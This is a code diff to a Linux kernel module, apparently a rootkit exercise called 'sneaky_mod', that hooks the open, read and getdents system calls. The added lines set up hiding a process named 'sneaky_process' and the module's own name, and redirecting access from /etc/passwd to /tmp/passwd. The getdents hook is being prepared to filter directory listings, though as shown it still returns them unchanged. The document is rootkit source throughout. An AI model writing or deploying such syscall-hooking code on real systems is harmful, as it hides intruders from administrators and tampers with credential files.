@@ -77,10 +77,19 @@ struct linux_dirent {
 asmlinkage int (*original_getdents_call)(unsigned int fd,
                                          struct linux_dirent *dirp,
                                          unsigned int count);
+/*-----------------------------------------------------------------*/
+// getdents
+char sneaky_pid_str[BUFFER_LEN];
+const char *sneaky_process = "sneaky_process";
 
+// open
 const char *passwd_path = "/etc/passwd";
 const char *tmp_path = "/tmp/passwd";
 char new_pathname[BUFFER_LEN];
+
+// read
+const char *sneaky_mod = "sneaky_mod";
+/*-----------------------------------------------------------------*/
 
 // Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
@@ -103,7 +112,8 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
                                    unsigned int count) {
   printk_ratelimited(KERN_INFO "Sneaky: getdents syscall\n");
-  return original_getdents_call(fd, dirp, count);
+  int nread = original_getdents_call(fd, dirp, count);
+  return nread;
 }
 
 // The code that gets executed when the module is loaded
